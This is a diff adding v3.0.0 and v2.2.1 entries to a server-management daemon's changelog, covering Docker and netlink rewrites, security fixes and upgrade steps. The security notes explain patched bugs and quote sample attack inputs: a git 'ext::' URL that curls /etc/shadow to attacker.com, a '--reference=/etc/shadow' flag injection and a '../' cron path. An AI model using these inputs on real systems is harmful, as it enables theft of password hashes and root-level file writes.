@@ -6,6 +6,220 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/), and this
 
 ---
 
+## v3.0.0 (2026-02-18) — **"Security Hardening & Native APIs"**
+
+### ⚡ Major: Docker exec.Command → stdlib REST client
+
+All container lifecycle operations now use the Docker Engine REST API directly
+over `/var/run/docker.sock` via a thin stdlib `net/http` client — zero new
+dependencies, no CGO, no shell involved.
+
+**New package: `internal/dockerclient`** (pure stdlib, no imports outside std library)
+
+| Method | Replaces |
+|---|---|
+| `ListAll(ctx)` | `docker ps -a --format {{json .}}` |
+| `Inspect(ctx, id)` | `docker inspect --format ... NAME` |
+| `Start(ctx, id)` | `docker start NAME` |
+| `Stop(ctx, id, t)` | `docker stop -t T NAME` |
+| `Restart(ctx, id, t)` | `docker restart NAME` |
+| `Pause(ctx, id)` | `docker pause NAME` |
+| `Unpause(ctx, id)` | `docker unpause NAME` |
+| `Remove(ctx, id, force, vol)` | `docker rm [-f] [-v] NAME` |
+| `PullImage(ctx, image)` | `docker pull IMAGE` |
+| `Logs(ctx, id, opts)` | `docker logs --tail N NAME` |
+| `WaitForHealthy(ctx, id, timeout)` | `docker inspect` polling loop |
+| `IsAvailable(ctx)` | `docker info` / `which docker` |
+
+### ⚡ Major: Linux netlink (`ip link/addr/route`) → stdlib syscall client
+
+New package: `internal/netlinkx` — rtnetlink via raw `syscall.Socket(AF_NETLINK, ...)`, no external dependencies, no CGO.
+
+Replaces ~15 `ip(8)` exec calls across `system.go` and `network_advanced.go`:
+
+| Handler | Replaced |
+|---|---|
+| `system.go` handleNetworkGet | `ip -j addr show` → `netlinkx.AddrList()` (stdlib `net.Interfaces()`) |
+| `system.go` handleNetworkGet | `ip -j route show` → `netlinkx.RouteList()` (reads `/proc/net/route`) |
+| `system.go` configure action | `ip addr replace CIDR dev IFACE` → `netlinkx.AddrReplace()` (RTM_NEWADDR) |
+| `system.go` configure action | `ip route replace default via GW` → `netlinkx.RouteReplace()` (RTM_NEWROUTE) |
+| `network_advanced.go` CreateVLAN | `ip link add ... type vlan` → `netlinkx.LinkAdd(LinkTypeVLAN)` |
+| `network_advanced.go` CreateVLAN | `ip link set NAME up` → `netlinkx.LinkSetUp()` |
+| `network_advanced.go` CreateVLAN | `ip addr add CIDR dev IFACE` → `netlinkx.AddrAdd()` |
+| `network_advanced.go` DeleteVLAN | `ip link delete NAME` → `netlinkx.LinkDel()` |
+| `network_advanced.go` ListVLANs | `ip -d link show type vlan` → `netlinkx.LinkList()` filtered |
+| `network_advanced.go` CreateBond | `ip link add ... type bond` → `netlinkx.LinkAdd(LinkTypeBond)` |
+| `network_advanced.go` CreateBond | `ip link set SLAVE down` → `netlinkx.LinkSetDown()` |
+| `network_advanced.go` CreateBond | `ip link set SLAVE master BOND` → `netlinkx.LinkSetMaster()` |
+
+### 🔒 Security fix: Git repository URL RCE via `ext::` transport
+
+**Severity: Critical** (RCE as root daemon user)
+
+git's `ext::` transport protocol executes an arbitrary subprocess:
+```
+ext::sh -c 'curl http://attacker.com/$(cat /etc/shadow)'
+```
+A repo URL containing this would have been stored in the DB and executed on the next pull/clone cycle. `file://` similarly allowed reading local files outside the expected path.
+
+**Fix:** `validateRepoURL()` enforces an allowlist of permitted schemes:
+- Allowed: `https://`, `http://`, `git://`, `ssh://`, `git@host:path` (SCP)  
+- Blocked: everything else (`ext::`, `file://`, `fd::`, custom transports)
+- Applied at: `TestConnectivity` (before `git ls-remote`) and `SaveRepo` (before storing to DB)
+
+**Note on go-git:** go-git was evaluated as an alternative. It suffers the same `ext::` vulnerability — the transport is resolved at the git library level, not exec level. URL validation is the correct fix regardless of implementation.
+
+### What ZFS stays exec (and why)
+
+go-libzfs requires CGO + `libzfs-dev` at build time and at runtime. Cross-compilation breaks, deployment packages bloat, and the existing whitelist validation (`security.ValidateCommand`, `security.ValidateDatasetName`, etc.) already prevents injection. The 59 ZFS exec calls are protected by input validation, not by library migration.
+
+### Docker Stats / Compose: exec retained
+
+`docker stats --no-stream` and `docker compose up/down/ps` are exec calls with no user-controlled arguments reaching the command line. No security benefit from replacement.
+
+### 🔒 Pre-Release Security Audit (2026-02-18)
+
+Comprehensive security audit prior to public release. Two showstoppers and five high-priority issues identified and fixed.
+
+#### Showstopper #1: Path Traversal in File Read Operations
+**files_extended.go** — `ListFiles()`, `GetFileProperties()`, `RenameFile()`, `CopyFile()`, `UploadChunk()` used only `filepath.Clean()` without `validateFilePath()` restriction to allowed base paths. Authenticated users could list/read/rename/copy any system directory.
+
+**Fix:** `validateFilePath()` (with `allowedBasePaths` restriction) applied to all 5 functions (7 validation points total).
+
+#### Showstopper #2: CSRF Token Generated But Never Validated
+Frontend sent `X-CSRF-Token` header, backend generated tokens at `/api/csrf`, but no middleware validated them. CSRF protection was security theater.
+
+**Fix:** Replaced entire auth mechanism with HttpOnly cookie-based sessions:
+- Login sets `dplaneos_session` cookie (`HttpOnly; SameSite=Strict; Path=/`)
+- Login sets `dplaneos_user` cookie (readable by JS for UI display)
+- Session middleware reads from cookie (primary) with `X-Session-ID` header as legacy fallback
+- `SameSite=Strict` provides real CSRF protection (browser never sends cookies cross-origin)
+- Sessions persist across tab close and browser restart (vs. sessionStorage which died on tab close)
+- Multi-tab support (all tabs share the same session)
+
+#### High: chown/chmod Input Validation
+Owner/group/permissions passed unvalidated to `exec.Command`. Flag injection possible via `--reference=/etc/shadow`.
+
+**Fix:** Owner/group validated against `^[a-zA-Z0-9_][a-zA-Z0-9_.\-]*$`, permissions against `^[0-7]{3,4}$`.
+
+#### High: Missing Database Columns on Fresh Install
+`users` table schema missing `must_change_password` and `role` columns. `COALESCE()` handles NULL but not missing columns — fresh install login would crash.
+
+**Fix:** `ALTER TABLE` migrations added to schema initialization (idempotent).
+
+#### High: Admin User Has No Password
+`seedDefaults()` created admin without `password_hash`. Login impossible on fresh install.
+
+**Fix:** Default password `dplaneos` with `must_change_password=1`. bcrypt-hashed at seed time.
+
+#### Medium: Rate Limiter Memory Leak
+`requestCounts` map grew unbounded — old IPs never cleaned up.
+
+**Fix:** Periodic cleanup goroutine every 10 minutes removes stale entries.
+
+### 📦 Version Unification
+
+All version strings unified to 3.0.0 across the entire codebase:
+- `VERSION` file, daemon binary, nginx config, core.js, all HTML page badges,
+  login page, setup wizard, settings display, all JS file headers, README,
+  all documentation files
+
+### Changed
+
+- Default login credentials: `admin` / `dplaneos` (was: `admin` / no password)
+- Session auth: HttpOnly cookies (was: sessionStorage + manual headers)
+- Routes: 171+ API endpoints
+- Dashboard: removed non-functional Docker images counter (no backend support)
+- Redirect pages (`network-interfaces.html`, `groups.html`, `system-monitoring.html`) marked as intentional v3.0.0 compatibility redirects
+
+---
+
+## v2.2.1 (2026-02-18) — **"Security & Reliability Audit Fixes"**
+
+Based on a systematic code audit identifying real implementation gaps (not marketing claims).
+
+### 🔴 Critical: Runtime ZFS Pool Loss → Docker Still Running
+
+**Problem:** The v2.1.1 boot gate prevented the Docker-before-ZFS race at startup.
+But if a pool went `SUSPENDED`, `UNAVAIL`, or read-only *during operation* (cable fault,
+controller error, drive failure), the heartbeat only logged and alerted — Docker kept
+running and containers wrote to the bare mountpoint directory on the root filesystem.
+
+**Fix: `pool_heartbeat.go` — `maybeStopDocker()`**
+- New field `StopDockerOnFailure bool`, enabled by default in `main.go`
+- On `SUSPENDED/UNAVAIL` or write-probe failure: calls `systemctl stop docker`
+- Guard: fires only once per failure window, resets when pool recovers
+- Logged at both WARNING and CRITICAL level with restart instructions
+
+### 🔴 Critical: Path Traversal in Git Sync compose_path
+
+**Problem:** `compose_path` from user input was passed directly to `filepath.Join`,
+then used in `git add`, `os.WriteFile`, and `docker compose -f`. A value like
+`../../etc/cron.d/evil` would escape the repository directory and allow writing
+arbitrary files on the system with root privileges.
+
+**Fix: `git_sync_repos.go` — `validateComposePath()`**
+- Rejects absolute paths and null bytes
+- `filepath.Clean()` resolves `..` components before prefix check
+- Prefix check: joined result must stay under `localPath/` with separator
+- Applied in **4 places**: `SaveRepo`, `DeployRepo`, `ExportToRepo`, `PushRepo`
+
+### 🟡 Medium: Audit Buffer — Security Events Lost on SIGKILL
+
+**Problem:** All events went through the 100-event buffer flushed every 5 seconds.
+A `SIGKILL` (OOM killer, `kill -9`) lost up to 100 events including auth failures,
+permission denials, and user management actions.
+
+**Fix: `buffered_logger.go` — `SecurityActions` map + `writeDirect()`**
+- 10 security-critical action types bypass the buffer entirely and write directly
+  to SQLite in a synchronous transaction: `login`, `login_failed`, `logout`,
+  `auth_failed`, `permission_denied`, `user_created/deleted`, `password_changed`,
+  `token_created/revoked`
+- Non-security events continue to use the buffer (no performance regression)
+- `writeDirect()` is a separate code path — cannot deadlock with buffer mutex
+
+### 🟡 Medium: Health Check — 5s Hardcoded, False Positives for Slow Apps
+
+**Problem:** `POST /api/docker/update` waited exactly 5 seconds then declared success.
+Databases (PostgreSQL, MariaDB) and Java applications (Nextcloud, Jellyfin AIO) take
+10–120 seconds to fully initialize. A container could be "running" but internally
+still starting, or pass the running check and then crash 10 seconds later.
+
+**Fix: `docker_enhanced.go` — `waitForHealthy()` + `health_check_seconds`**
+- New request field `health_check_seconds` (0 = default 30s)
+- `waitForHealthy()` polls every 2 seconds with awareness of Docker's `HEALTHCHECK`:
+  - No `HEALTHCHECK` defined: waits for `State.Running == true` (was: identical)
+  - `HEALTHCHECK` defined: waits for `Health.Status == "healthy"` (new)
+  - `unhealthy`: fails immediately without waiting for timeout
+- Default raised from 5s to 30s
+
+### 🟢 Low: ECC Detection Unreliable in Virtual Machines
+
+**Problem:** `dmidecode` in VMs (Proxmox, ESXi, KVM, VirtualBox) returns empty memory
+tables or "Unknown" types. The dashboard showed an ECC warning that was technically
+meaningless in a virtual environment, causing confusion.
+
+**Fix: `system_status.go` — `ECCStatus` struct + `isVirtualMachine()`**
+- VM detection checks `/sys/class/dmi/id/product_name` and `/proc/cpuinfo` hypervisor bit
+- Three states instead of binary true/false:
+  - Physical + ECC: no warning
+  - Physical + no ECC: warning with mitigation link
+  - VM / dmidecode unavailable: neutral info message ("check host hardware directly")
+- API response adds `ecc_known`, `ecc_virtual`, `ecc_warning_msg` fields
+- Dashboard renders correct message per state
+
+### Points Not Fixed (with reasoning)
+
+**Inconsistent SQLite sync (claimed):** Audit found all connections already use
+`_synchronous=FULL` after v2.1.1 patches. No further action needed.
+
+**Legacy `exec.Command` vs Go libraries:** Valid architectural concern for future
+major versions. Replacing `zfs`/`docker` CLI calls with native APIs is a significant
+rewrite scope. Current mitigation is whitelist validation + no shell interpreter
+(direct `exec.Command`, not `sh -c`).
+
+---
+
 ## v2.2.0 (2026-02-17) — **"Git Sync: Bidirectional Multi-Repo"**
 
 ### ✨ New Feature: Bidirectional Git Sync
@@ -601,6 +815,18 @@ Result: all 14 tabs functional.
 
 ## Upgrade Path
 
+### v2.x → v3.0.0
+
+Drop-in replacement. Same database schema (auto-migrated), same daemon flags. Session cookies replace sessionStorage — users will need to re-login once after upgrade.
+
+```bash
+tar xzf dplaneos-v3.0.0.tar.gz
+cd dplaneos && sudo make install
+sudo systemctl restart dplaned
+```
+
+**Default login after fresh install:** `admin` / `dplaneos` (forced password change on first login)
+
 ### v1.14.0-OMEGA → v2.0.0
 
 **This is not an in-place upgrade.** v2.0.0 is a complete rewrite.
@@ -609,7 +835,7 @@ Result: all 14 tabs functional.
 # Fresh install
 tar xzf dplaneos-v2.0.0-production-vendored.tar.gz
 cd dplaneos && sudo make install
-sudo systemctl start dplaneos
+sudo systemctl start dplaned
 ```
 
 Your ZFS pools, datasets, shares, and Docker containers remain on disk. Only the management layer changes. Re-import your configuration as needed.
